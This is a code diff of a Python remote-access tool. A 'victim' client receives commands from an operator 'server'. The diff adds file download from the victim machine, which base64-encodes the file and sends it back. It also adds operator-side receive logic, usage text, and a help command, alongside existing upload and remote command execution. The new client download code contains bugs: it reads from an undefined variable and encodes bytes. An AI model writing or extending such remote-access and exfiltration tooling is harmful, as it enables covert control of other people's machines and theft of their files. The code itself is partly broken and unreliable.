@@ -20,14 +20,19 @@ class ClientMain:
 		self.cmdModules = ["upload", "download", "exec"]
 
 	def registerCMDModules(self, modules:list):
+
+		# Iterate over every module to registered
 		for module in modules:
+		
+			# Register the module if necessary
 			if module not in self.cmdModules:
 				self.cmdModules.append(module)
+
 
 	def runCMD(self, cmd:list):
 
 		# If module does not exist execute it on the current system
-		if not cmd[0] in self.cmdModules:
+		if cmd[0] not in self.cmdModules:
 		   self.handler.send_msg("CMD_NOT_FOUND")
 
 		# Get the command's function
@@ -40,9 +45,14 @@ class ClientMain:
 		return cmdFunction(cmd)
 
 	def upload(self, argv):
+
+		# Receive remote file path to write to
 		filename = self.handler.recv_msg()
+
 		try:
-			targetFile = open(filename, 'wb')
+
+			# Create file stream for writing
+			targetFile = open(filename, 'wb') 
 			
 			# Receive data from client
 			data = self.handler.recv_msg()
@@ -62,7 +72,24 @@ class ClientMain:
 		return 'CMD_SUCCESS'
 
 	def download(self, argv):
-		pass
+		
+		# Receive remote file path to read from
+		filename = self.handler.recv_msg()
+		try:
+
+			# Create file stream for reading
+			data = open(file, 'rb').read()
+
+			# Encode data
+			data = base64.b64encode(data.encode('ascii'))
+
+			# Send data to client
+			self.handler.send_msg(data)
+
+		except Exception as exc:
+			return 'CMD_FAIL: {}'.format(exc)
+
+		return 'CMD_SUCCESS'
 
 	def exec(self, argv):
 		cmd = self.handler.recv_msg()
@@ -79,8 +106,13 @@ class ServerMain:
 	def __init__(self, handler):
 		self.handler = handler
 		self.conn = handler.conn
-		self.cmdModules = ["upload", "download", "exec", "goodbye"]
-
+		self.cmdModules = ["upload", "download", "exec", "goodbye", "help"]
+		self.cmdModuleHelp = {
+			"upload": "Usage: upload [LFILE] [RFILE]",
+			"download": "Usage: download [RFILE] [LFILE]",
+			"exec": "Usage: exec [REMOTE SYSTEM COMMAND]",
+			"goodbye": "Usage: Close connection"
+		}
 
 	def registerCMDModules(self, modules:list):
 		for module in modules:
@@ -90,15 +122,18 @@ class ServerMain:
 	def runCMD(self, cmd):
 
 		# If module does not exist execute it on the current system
-		if not cmd[0] in self.cmdModules:
+		if cmd[0] not in self.cmdModules:
 			os.system(cmd[0])
 			return
 
 		# Get the command's function
 		cmdFunction = getattr(self, cmd[0])
 
-		# Notify victim of cmd to be executed
-		self.handler.send_msg(cmd[0])
+		# If its not a server only
+		if cmd[0] not in ["help", "goodbye"]:
+
+			# Notify victim of cmd to be executed
+			self.handler.send_msg(cmd[0])
 
 		# Run the command
 		return cmdFunction(cmd)
@@ -108,8 +143,9 @@ class ServerMain:
 		if len(argv) < 3:
 			return b'INVALID_ARGUMENT'
 
-		LFILE = argv[1]
-		RFILE = argv[2]
+		LFILE = argv[1] # Local file
+
+		RFILE = argv[2] # Remote file
 
 		# Open lfile for reading
 		DATA = open(LFILE, 'rb').read()
@@ -130,10 +166,23 @@ class ServerMain:
 		if len(argv) < 3:
 			return b'INVALID_ARGUMENT'
 
-		RFILE = argv[1]
-		LFILE = argv[2]
+		RFILE = argv[1] # Remote file
 
-		return b'INVALID_ARGUMENT'
+		LFILE = argv[2] # Local file
+
+		# Send remote file name
+		self.handler.send_msg(RFILE)
+
+		# Receive file data
+		DATA = self.handler.recv_msg() 
+
+		# Decode data with base64
+		DATA = base64.b64decode(DATA)
+
+		# Write data to file
+		open(LFILE, 'wb').write(DATA)
+
+		return self.handler.recv_msg()
 
 
 	def exec(self, argv):
@@ -151,3 +200,34 @@ class ServerMain:
 	def goodbye(self, argv):
 		self.conn.close()
 		self.conn = None
+
+	def help(self, argv):
+		
+		# If an argument was provided
+		if len(argv) > 1:
+
+			# If it is an existing module
+			if argv[1] in self.cmdModules:
+
+				# If a help page exists for the command
+				if argv[1] in self.cmdModuleHelp.keys():
+
+					# Print the usage
+					print(self.cmdModuleHelp[argv[1]])
+
+				# If no help page is available for this command
+				else:
+					print("{} has no manual page".format(argv[1]))
+
+			# If the module does not exist
+			else:
+				print("No such module exists.")
+
+		# If no arguments were provided
+		else:
+
+			print("Registered %d command modules: " % len(self.cmdModules))
+			print("-" * 13)
+			# Print all modules
+			for module in self.cmdModules:
+				print("-", module,"")
